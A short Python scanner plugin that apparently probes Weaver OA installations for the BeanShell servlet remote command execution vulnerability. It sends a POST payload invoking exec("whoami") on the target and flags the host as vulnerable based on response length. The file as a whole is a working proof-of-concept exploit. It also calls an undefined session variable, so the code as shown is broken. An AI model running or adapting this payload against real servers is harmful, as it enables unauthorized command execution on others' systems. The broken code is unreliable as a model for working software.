#coding:utf-8
import requests
import requests.packages.urllib3
requests.packages.urllib3.disable_warnings()
def msg():
  ret = {}
  ret['links'] = ''
  ret['huixian'] = ''
  ret['method'] = 'get'
  ret['bugname'] = "泛微OA远程命令执行漏洞"
  ret['level'] = "high"
  ret['FOFA'] = ''
  ret['author'] = 'ppxfx'
  ret['ifbug'] = False

  return ret

def run(url,ua):
	ret = msg()
	target = '/weaver/bsh.servlet.BshServlet'
	payload = 'bsh.script=exec(%22whoami%22)&bsh.servlet.captureOutErr=true&bsh.servlet.output=raw'
	url1 = url + target
	ret['url'] = url1
	headers = {
			    'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 12_10) AppleWebKit/600.1.25 (KHTML, like Gecko) Version/12.0 Safari/1200.1.25',
			    'Content-Type': 'application/x-www-form-urlencoded',
			}
	try:
		res = s.get(url1,verify=False,headers=headers,timeout=5)#忽略了SSL验证
		if res.status_code == 200 and "访问禁止" not in res.text:
			res = s.post(url=url1, verify=False, data=payload, headers=headers, timeout=8)
			res.encoding = res.apparent_encoding  #指定编码，防止乱码
			rs_len = len(res.text)
			if rs_len < 50:
				ret['ifbug'] = True
				res.close()
				return ret
			else:
				return ret
		else:
			return ret
	except:
		return ret